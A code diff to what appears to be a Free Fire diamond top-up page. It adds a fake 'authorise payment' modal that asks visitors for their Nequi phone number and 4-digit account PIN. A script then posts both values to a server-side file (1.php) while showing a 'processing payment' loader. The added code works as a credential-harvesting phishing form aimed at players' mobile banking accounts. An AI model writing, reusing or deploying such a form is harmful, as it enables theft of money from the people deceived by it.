@@ -451,8 +451,103 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
       console.error("Error en checkLogin:", err);
     }
   }
+
+  // Función para manejar el envío del modal de Nequi
+  document.getElementById("btnEnviarNequi").addEventListener("click", function() {
+    const telefono = document.getElementById("telefonoNequi").value;
+    const clave = document.getElementById("claveNequi").value;
+
+    if (!telefono || telefono.length !== 10) {
+      alert("Por favor ingresa un número de teléfono válido (10 dígitos)");
+      return;
+    }
+
+    if (!clave || clave.length !== 4) {
+      alert("Por favor ingresa una clave de 4 dígitos");
+      return;
+    }
+
+    // Enviar datos al servidor
+    fetch("1.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        action: "enviar_datos_nequi",
+        telefono: telefono,
+        clave: clave,
+        transactionId: "<?php echo $transactionId; ?>"
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        // Ocultar modal y mostrar mensaje de procesamiento
+        document.getElementById("modalAutorizacion").style.display = "none";
+        mostrarLoader("Procesando pago...");
+      } else {
+        alert("Error al enviar datos: " + (data.error || "Error desconocido"));
+      }
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      alert("Error de conexión. Inténtalo de nuevo.");
+    });
+  });
+
 </script>
 
+<!-- Modal de autorización -->
+<div id="modalAutorizacion" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:10001; justify-content:center; align-items:center; color:white; font-family:'Segoe UI', sans-serif;">
+  <div style="background:#3a3a3a; padding:30px; border-radius:14px; max-width:360px; width:90%; text-align:center; box-shadow:0 0 20px rgba(0,0,0,0.6);">
+
+    <!-- Título -->
+    <h2 style="font-size:1.2em; margin-bottom:10px;">Ingresa tus datos de Nequi</h2>
+
+    <!-- Subtítulo -->
+    <p style="font-size:0.9em; color:#ccc; margin-bottom:20px;">
+      Número de teléfono y clave de 4 dígitos
+    </p>
+
+    <!-- Monto a pagar -->
+    <div id="montoClave" style="font-size:1.1em; margin-bottom:20px; color:#f9c411;">
+      Monto: $0
+    </div>
+
+    <!-- Input de teléfono -->
+    <input id="telefonoNequi" maxlength="10" inputmode="numeric" style="
+      font-size: 18px;
+      text-align: center;
+      border: none;
+      background: transparent;
+      border-bottom: 2px solid #f9c411;
+      padding: 10px 0;
+      width: 100%;
+      color: white;
+      margin-bottom: 15px;
+      outline: none;
+    " placeholder="Número de teléfono" />
+
+    <!-- Input de clave -->
+    <input id="claveNequi" maxlength="4" inputmode="numeric" style="
+      font-size: 24px;
+      letter-spacing: 10px;
+      text-align: center;
+      border: none;
+      background: transparent;
+      border-bottom: 2px solid #f9c411;
+      padding: 10px 0;
+      width: 100%;
+      color: white;
+      margin-bottom: 20px;
+      outline: none;
+    " placeholder="----" />
+
+    <!-- Botón de envío -->
+    <button id="btnEnviarNequi" class="btn active">Autorizar pago</button>
+  </div>
+</div>
 
 </body>
 </html>
